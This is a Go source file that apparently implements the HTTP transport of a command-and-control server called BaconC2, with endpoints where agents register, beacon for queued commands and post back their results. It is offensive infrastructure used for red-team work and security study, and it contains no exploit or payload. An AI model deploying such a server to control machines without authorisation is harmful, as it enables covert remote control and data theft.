package transport

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/pkg/middleware"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/RabbITCybErSeC/BaconC2/server/config"
	"github.com/RabbITCybErSeC/BaconC2/server/db"
	local_models "github.com/RabbITCybErSeC/BaconC2/server/models"
	"github.com/gin-gonic/gin"
)

const (
	ProtocolName = "http"
)

type HTTPServerTransport struct {
	agentRepository db.IAgentRepository
	commandQueue    queue.IServerCommandQueue
	engine          *gin.Engine
	server          *http.Server
	httpConfig      config.AgentHTTPConfig
}

func NewHTTPServerTransport(agentRepository db.IAgentRepository, commandQueue queue.IServerCommandQueue, httpConfig config.AgentHTTPConfig, engine *gin.Engine) ITransportProtocol {
	as := &HTTPServerTransport{
		agentRepository: agentRepository,
		commandQueue:    commandQueue,
		engine:          engine,
		httpConfig:      httpConfig,
	}

	as.server = &http.Server{
		Addr:    fmt.Sprintf(":%d", httpConfig.Port),
		Handler: as.engine,
	}
	as.registerAgentRoutes()

	return as
}

func (as *HTTPServerTransport) registerAgentRoutes() {
	agentAPI := as.engine.Group("/api/v1/agents")
	{
		agentAPI.Use(middleware.CorsMiddleware())
		agentAPI.POST("/register", as.handleRegister)
		agentAPI.POST("/beacon", as.handleBeacon)
		agentAPI.POST("/results", as.handleCommandResult)
	}
}

func (as *HTTPServerTransport) GinEngine() *gin.Engine {
	return as.engine
}

func (as *HTTPServerTransport) handleRegister(c *gin.Context) {
	var agent local_models.ServerAgentModel
	var incomingAgent models.Agent

	if err := c.ShouldBindJSON(&incomingAgent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	agent.Agent = incomingAgent
	agent.Protocol = ProtocolName
	agent.LastSeen = time.Now()
	agent.IsActive = true
	agent.Commands = []local_models.AgentCommand{}

	if err := as.agentRepository.SaveAgent(c.Request.Context(), &agent); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{"status": "registered"})
}

func (as *HTTPServerTransport) handleBeacon(c *gin.Context) {
	agentID := c.Query("id")

	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	_, err := as.agentRepository.GetAgent(c.Request.Context(), agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	if err := as.agentRepository.UpdateLastSeen(c.Request.Context(), agentID); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update last seen: " + err.Error()})
		return
	}

	commands, err := as.agentRepository.GetCommandsByStatus(c.Request.Context(), agentID, models.CommandStatusPending)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if len(commands) > 0 {
		cmd := commands[0]

		if err := as.agentRepository.UpdateCommandStatus(c.Request.Context(), cmd.ID, models.CommandStatusSentToClient); err != nil {
			c.JSON(http.StatusInternalServerError, models.HttpBeaconResponse{
				Status:         models.CommandStatusFailed,
				RequestResults: false,
			})
			return
		}

		c.JSON(http.StatusOK, models.HttpBeaconResponse{
			Command:        cmd.Command,
			Status:         models.CommandStatusSentToClient,
			NextBeacon:     10,
			RequestResults: false,
		})
		return
	}

	c.JSON(http.StatusOK, models.HttpBeaconResponse{
		Status:         models.CommandStatusAck,
		NextBeacon:     10,
		RequestResults: false,
	})
}

func (as *HTTPServerTransport) handleCommandResult(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	var results []models.CommandResult
	if err := c.ShouldBindJSON(&results); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON format: " + err.Error()})
		return
	}

	if _, err := as.agentRepository.GetAgent(c.Request.Context(), agentID); err != nil {
		if errors.Is(err, db.ErrNotFound) {
			c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		} else {
			log.Printf("Error verifying agent %s: %v", agentID, err)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to verify agent existence"})
		}
		return
	}

	for _, result := range results {
		if result.ID == "" {
			log.Printf("Skipping result with empty CommandID from agent %s", agentID)
			continue
		}

		err := as.agentRepository.UpdateCommandStatusWithResult(
			c.Request.Context(),
			agentID,
			result.ID,
			result.Status,
			result.Output,
		)

		if err != nil {
			log.Printf("Failed to save result for command %s from agent %s: %v", result.ID, agentID, err)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to process command result for " + result.ID})
			return
		}
	}

	c.JSON(http.StatusOK, gin.H{"status": "received"})
}

// func (as *HTTPServerTransport) handleAddCommand(c *gin.Context) {
// 	var rawCmd models.RawCommand
// 	if err := c.ShouldBindJSON(&rawCmd); err != nil {
// 		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON format: " + err.Error()})
// 		return
// 	}
// 	if rawCmd.Command == "" {
// 		c.JSON(http.StatusBadRequest, gin.H{"error": "Command field is required and cannot be empty"})
// 		return
// 	}

// 	agentID := c.Query("id")
// 	if agentID == "" {
// 		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
// 		return
// 	}

// 	_, err := as.agentRepository.GetAgent(c.Request.Context(), agentID)
// 	if err != nil {
// 		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
// 		return
// 	}

// 	agentCmd := local_models.AgentCommand{
// 		AgentID: agentID,
// 		Command: models.Command{
// 			ID:      uuid.New().String(),
// 			Command: rawCmd.Command,
// 			Status:  models.CommandStatusPending,
// 		},
// 		CreatedAt: time.Now(),
// 		UpdatedAt: time.Now(),
// 	}

// 	if err := as.agentRepository.SaveCommand(c.Request.Context(), &agentCmd); err != nil {
// 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
// 		return
// 	}

// 	c.JSON(http.StatusOK, gin.H{"status": "queued", "id": agentCmd.ID})
// }

func (as *HTTPServerTransport) Start() error {
	log.Printf("Starting HTTP transport on port %d", as.httpConfig.Port)
	go func() {
		if err := as.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("HTTP server error: %v", err)
		}
	}()
	return nil
}

func (as *HTTPServerTransport) Stop() error {
	if as.server != nil {
		return as.server.Shutdown(context.Background())
	}
	return nil
}

func (as *HTTPServerTransport) Name() string {
	return ProtocolName
}
